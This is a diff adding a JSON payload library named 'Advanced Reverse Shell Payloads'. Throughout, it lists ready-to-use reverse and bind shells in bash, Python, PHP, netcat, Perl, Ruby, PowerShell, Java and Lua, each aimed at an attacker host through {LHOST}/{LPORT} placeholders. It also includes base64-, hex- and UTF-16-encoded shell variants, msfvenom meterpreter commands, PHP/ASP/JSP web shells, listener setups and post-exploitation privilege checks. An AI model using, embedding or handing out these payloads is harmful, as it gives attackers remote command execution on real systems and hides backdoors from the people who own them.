@@ -1,0 +1,97 @@
+{
+  "metadata": {
+    "name": "Advanced Reverse Shell Payloads",
+    "description": "Comprehensive collection of reverse shell payloads for various platforms and environments",
+    "author": "Bl4ckC3ll_PANTHEON",
+    "version": "1.0.0",
+    "categories": ["reverse_shells", "meterpreter", "web_shells", "encoded_payloads"]
+  },
+  "payloads": {
+    "bash_reverse_shells": {
+      "basic_bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+      "bash_encoded": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC97TEhPU1R9L3tMUE9SVH0gMD4mMQ==' | base64 -d | bash",
+      "bash_exec": "exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
+      "bash_0_reverse": "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196"
+    },
+    "python_reverse_shells": {
+      "python2_basic": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "python3_basic": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "python_threading": "python -c 'import socket,subprocess,os,threading;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "python_pty": "python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\");'"
+    },
+    "php_reverse_shells": {
+      "php_basic": "<?php $sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
+      "php_system": "<?php system('bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"'); ?>",
+      "php_passthru": "<?php passthru('bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"'); ?>",
+      "php_exec": "<?php exec('bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"'); ?>",
+      "php_shell_exec": "<?php shell_exec('bash -c \"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"'); ?>"
+    },
+    "netcat_variants": {
+      "nc_basic": "nc -e /bin/sh {LHOST} {LPORT}",
+      "nc_traditional": "nc {LHOST} {LPORT} -e /bin/bash",
+      "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
+      "nc_mknod": "mknod /tmp/backpipe p && nc {LHOST} {LPORT} 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe",
+      "ncat_ssl": "ncat --ssl {LHOST} {LPORT} -e /bin/bash"
+    },
+    "perl_reverse_shells": {
+      "perl_basic": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "perl_no_sh": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{LHOST}:{LPORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+    },
+    "ruby_reverse_shells": {
+      "ruby_basic": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+      "ruby_no_sh": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    },
+    "powershell_reverse_shells": {
+      "powershell_basic": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+      "powershell_encoded": "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBMAEgATwBTAFQAfQAiACwAewBMAFAATwBSAFQAfQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+    },
+    "java_reverse_shells": {
+      "java_basic": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
+      "java_alternate": "Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC97TEhPU1R9L3tMUE9SVH0gMD4mMQ==}|{base64,-d}|{bash,-i}\".replace(\"{LHOST}\", \"{LHOST}\").replace(\"{LPORT}\", \"{LPORT}\"))"
+    },
+    "lua_reverse_shells": {
+      "lua_basic": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
+    },
+    "meterpreter_payloads": {
+      "windows_meterpreter_reverse_tcp": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
+      "linux_meterpreter_reverse_tcp": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf",
+      "php_meterpreter_reverse_tcp": "msfvenom -p php/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php",
+      "java_meterpreter_reverse_tcp": "msfvenom -p java/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f jar -o shell.jar",
+      "python_meterpreter_reverse_tcp": "msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f py -o shell.py",
+      "android_meterpreter_reverse_tcp": "msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o shell.apk",
+      "osx_meterpreter_reverse_tcp": "msfvenom -p osx/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o shell.macho"
+    },
+    "web_shells": {
+      "php_web_shell": "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>",
+      "asp_web_shell": "<%eval request(\"cmd\")%>",
+      "aspx_web_shell": "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \" + Request.QueryString[\"cmd\"]);%>",
+      "jsp_web_shell": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
+    },
+    "encoded_payloads": {
+      "base64_bash": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC97TEhPU1R9L3tMUE9SVH0gMD4mMQ==' | base64 -d | bash",
+      "hex_bash": "echo '626173682d69203e26202f6465762f7463702f7b4c484f53547d2f7b4c504f52547d20303e2631' | xxd -r -p | bash",
+      "url_encoded_bash": "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{LHOST}%2F{LPORT}%200%3E%261"
+    },
+    "bind_shells": {
+      "bash_bind": "bash -i >& /dev/tcp/0.0.0.0/{LPORT} 0>&1",
+      "nc_bind": "nc -lvp {LPORT} -e /bin/bash",
+      "python_bind": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    }
+  },
+  "listeners": {
+    "netcat": "nc -nvlp {LPORT}",
+    "ncat": "ncat -nvlp {LPORT}",
+    "ncat_ssl": "ncat --ssl -nvlp {LPORT}",
+    "socat": "socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane",
+    "metasploit": "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {LHOST}; set LPORT {LPORT}; run"
+  },
+  "post_exploitation": {
+    "upgrade_shell": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "export_term": "export TERM=xterm",
+    "stty_raw": "stty raw -echo; fg",
+    "background_shell": "^Z then: stty raw -echo; fg",
+    "check_sudo": "sudo -l",
+    "check_suid": "find / -perm -u=s -type f 2>/dev/null",
+    "check_capabilities": "getcap -r / 2>/dev/null"
+  }
+}
